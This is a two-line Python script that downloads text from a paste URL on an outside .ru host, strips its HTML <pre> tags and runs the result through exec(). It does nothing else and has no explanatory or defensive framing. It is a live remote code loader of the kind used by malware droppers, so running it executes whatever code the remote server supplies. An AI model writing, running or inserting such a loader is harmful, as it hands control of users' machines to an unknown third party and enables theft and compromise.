import requests

exec(requests.get('https://1312services.ru/paste?userid=4').text.replace('<pre>', '').replace('</pre>', ''))
